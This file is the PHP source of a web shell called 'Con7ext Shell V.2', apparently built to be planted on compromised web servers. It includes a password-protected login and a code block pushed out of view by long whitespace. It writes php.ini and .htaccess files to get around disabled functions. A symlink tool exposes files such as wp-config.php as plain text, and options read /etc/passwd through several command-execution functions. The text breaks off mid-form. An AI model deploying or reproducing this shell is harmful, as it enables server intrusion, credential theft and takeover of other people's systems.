<?php
######################################################
#Title :Con7ext Shell V.2                            #
######################################################
session_start();
set_time_limit(0);
error_reporting(0);
date_default_timezone_set("Asia/Jakarta");
$auth_pass = "b4150859324bcc86284b17453fd20828"; // HTML404
if(get_magic_quotes_gpc()) { 	
function VEstripslashes($array) { 		
return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array); 	} 	
$_POST = VEstripslashes($_POST); 
$_COOKIE = VEstripslashes($_COOKIE); } 


function Login() {
	die("
<html>
<head>
<title>Login Page</title>
<style type='text/css'>
html {
    margin: 20px auto;
    background:black;
    color: green;
    text-align: center;
}
pre {
    color: white;
}

input[type=password] {
	background:transparent;
	color:white;
	margin:0 10px;
	font-family:Homenaje;
	font-size:13px;
	border:2px solid white;
}

</style>
</head>
<center>
<br>
<br>
<header>
<audio autoplay='1' loop='1'><source src='http://con7ext-exeuser.rhcloud.com/music/Re_Zero%20-%20Paradisus-Paradoxum.mp3' type='audio/mp3'/></audio>
<img src='http://con7ext-exeuser.rhcloud.com/images/chaika.png' width='400' height='400' align='center'>
<br>
<br>
<pre align=center><form method='post'><input type='password' name='pass' style='background-color:none;border:1px solid #FFF;outline:none;' required><input type=submit value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>
");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if(!empty($auth_pass)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        Login();
}
?>
<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="" rel="stylesheet" type="text/css">
<title>Con7ext Shell V.2</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
  <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<style>
* {
 	font-family: Electrolize, sans-serif;
}
 	body { 
    background-color: black;
    background-size: 100%;
    background-repeat:no-repeat;
    margin: 0px;
 	font-family: "Electrolize", sans-serif; cursive;color:#fff;
 	font-size: 13px;
}
hr {
	background-color: #b3eeff; height: 3px; border: 0; 
}
a { 
 	text-decoration:none; color:#b3eeff; cursor: auto;} a:hover{
 	border-bottom-width: 1px;
 	border-bottom-style: solid;
 	border-bottom-color: #ffffff;
}
tbody {
 	display: table-row-group;
 	vertical-align: middle;
 	border-color: inherit;
}
table {
 	white-space: normal;
 	line-height: normal;
 	font-weight: normal;
 	font-style: normal;
 	color: -internal-quirk-inherit;
 	text-align: start;
 	font-variant: normal normal;
}
table {
 	display: table;
 	border-collapse: separate;
 	border-spacing: 2px;
 	border-color: grey;
}
tr {
 	display: table-row;
 	vertical-align: inherit;
 	border-color: inherit;
}
td, th {
 	display: table-cell;
 	vertical-align: inherit;
}
#menu a {
     font-family:ubuntu_monoregular;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;border:1;
     font-size: 12px;
     background:#191919;
     color:white;
     margin:5px 2px 4px 2px;
     padding:5px 8px;
     border-color: cyan;
     text-decoration:none;
     letter-spacing:1px;
     -moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
       }
#menu a:hover {
     font-size: 12px;
     background:#191919;-webkit-transform:rotate(0.0deg);-moz-transform:rotate(0.0deg);-ms-transform:rotate(0.0deg);-o-transform:rotate(0.0deg);transform:rotate(0.0deg);
     color: white;
     padding:5px 8px;
     margin:1px;
     border: 1px;
     font-family:ubuntu_monoregular;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;border:1;
     letter-spacing:1px;
     margin:5px 2px 4px 2px;
        -moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
       }

.content{ 
 	width:100%; text-decoration:none; color:#b3eeff;  
} 
a { 
    -webkit-transition:all .4s ease-in-out;-moz-transition:all .4s ease-in-out;-o-transition:all .4s ease-in-out;-ms-transition:all .4s ease-in-out;transition:all .4s ease-in-out text-decoration:none; 
} 
.content a:link {
 	text-decoration: none;
}
.content a:visited { 
}
.content a:hover {
 	background: #b3eeff; color: black; 
}
.content td{ 
 	padding:0 8px; line-height:24px; 
} 
.content th{ 
 	background: #191919; padding:3px 8px; font-weight:normal; 
} 
.content tr:hover{
 	cursor:pointer;
 	background-color: #111111;
}
input[type=submit]{ 
 	background:#000000; 
 	color:#b3eeff; 
 	margin:0 4px; 
 	font-size:13px; 
 	border:1px solid #444444; 
 	cursor:pointer;
 	-moz-border-radius: 5px;
    -webkit-border-radius: 5px;
    -khtml-border-radius: 5px;
} 
input[type=submit]:hover{ 
 	border-bottom:1px solid #ffffff;
 	font-size:13px; 
 	border-top:1px solid #ffffff; 
}
input[type=text], option, select {
 	background:#000000; 
 	border:0; 
 	padding:2px; 
 	border-bottom:1px solid #393939;
 	color:#b3eeff;
}
textarea {
 	margin:auto;
 	border:1px solid #333333;
 	width:100%;
 	height:400px;
 	background:#000000;
 	color:#b3eeff;
 	padding:0 2px;
 	font-size:12px;
}
#nav{position:fixed;z-index:999;top:0;width:100%;left:76%;
}
a.nav-fokus {display:block; width:auto; height:auto; background:transparent; border-top:0px; border-left: 1px solid #fff; border-right:1px solid #fff;  border-bottom:1px solid #fff;  padding:5px 8px; text-align:center; text-decoration:none; color:#b3eeff; line-height:20px; overflow:hidden; float:left;
}
a.nav-fokus:hover {color:#FFFFFF; background:#191919; border-top:0px; border-left: 1px solid #fff; border-right:1px solid #fff;  border-bottom:1px solid #fff;
}
</style>
</head>

<?php
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ?>';
			 $byph = "safe_mode = Off n disable_functions= ";
		$comp="PEZpbGVzICoucGhwPg0KRm9yY2VUeXBlIGFwcGxpY2F0aW9uL3gtaHR0cGQtcGhwNA0KPC9GaWxlcz4=";
		file_put_contents("php.ini",base64_decode($byph));
		file_put_contents("ini.php",base64_decode($iniph));
		file_put_contents(".htaccess",base64_decode($comp));
		echo "<script>alert('Disable Functions in Litespeed Created'); hideAll();</script>";
		echo"</center>";
}
} elseif ($_GET['symlink'] == '404'){
@error_reporting(0);
@ini_set('display_errors', 0); 
echo '<center><b><a href="https://www.facebook.com/rinto2234">Coded By Con7ext</a></b><br>
<form method="post"><br>File Target : <input name="dir" value="/home/user/public_html/wp-config.php">
<br>
<br>Save As: <input name="jnck" value="ojayakan.txt"><input name="ojaykan" type="submit" value="Eksekusi Gan"></form><br>';
if($_POST['ojaykan']){
rmdir("con7ext_symlink404");mkdir("con7ext_symlink404", 0777);
$dir = $_POST['dir'];
$jnck = $_POST['jnck'];
system("ln -s ".$dir." con7ext_symlink404/".$jnck);
symlink($dir,"con7ext_symlink404/".$jnck);
$inija = fopen("con7ext_symlink404/.htaccess", "w");
fwrite($inija,"ReadmeName ".$jnck."
Options Indexes FollowSymLinks
DirectoryIndex ngeue.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any
");
echo'<a href="con7ext_symlink404/" target="_blank">Klik Gan >:(</a>';
}
}elseif($_GET['bypass'] == 'passwd') {
	echo '<br><br><center>Bypass etc/passw With:<br>
<table style="width:50%">
  <tr>
    <td><form method="post"><input type="submit" value="System Function" name="syst"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passth"></form></td>
    <td><form method="post"><input type="submit" value="Exec Function" name="ex"></form></td>	
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shex"></form></td>		
    <td><form method="post"><input type="submit" value="Posix_getpwuid Function" name="melex"></form></td>
</tr></table>Bypass User With : <table style="width:50%">
<tr>
    <td><form method="post"><input type="submit" value="Awk Program" name="awkuser"></form></td>
    <td><form method="post"><input type="submit" value="System Function" name="systuser"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passthuser"></form></td>	
